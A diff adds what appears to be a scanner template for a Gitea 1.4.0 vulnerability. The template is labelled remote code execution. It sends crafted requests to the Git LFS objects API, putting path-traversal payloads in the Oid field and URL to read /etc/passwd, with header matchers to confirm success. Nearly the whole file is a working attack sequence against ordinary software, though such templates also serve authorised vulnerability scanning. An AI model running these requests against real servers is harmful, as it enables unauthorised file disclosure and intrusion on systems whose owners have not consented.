@@ -1,0 +1,52 @@
+id: gitea-rce
+brief:
+    title: Gitea 1.4.0 - Remote Code Execution
+    by: theamanrawat
+    level: critical
+    about: Gitea 1.4.0 is vulnerable to remote code execution.
+    label:
+        - gitea
+        - rce
+        - unauth
+        - edb
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/api/v1/repos/search?limit=1'
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+          in: header_3
+          need: all
+    - verb: POST
+      to:
+        - '{{BaseURL}}/{{repo}}.git/info/lfs/objects'
+      head:
+        Accept: application/vnd.git-lfs+json
+        Content-Type: application/json
+      body: |-
+        {
+            "Oid": "....../../../etc/passwd",
+            "Size": 1000000,
+            "User" : "{{randstr}}",
+            "Password" : "{{randstr}}",
+            "Repo" : "{{randstr}}",
+            "Authorization" : "{{randstr}}"
+        }
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+          in: header_3
+          need: all
+    - verb: GET
+      to:
+        - '{{BaseURL}}/{{repo}}.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth'
+      signs:
+        - "on": word
+          has:
+            - application/octet-stream
+          in: header_3
+          need: all
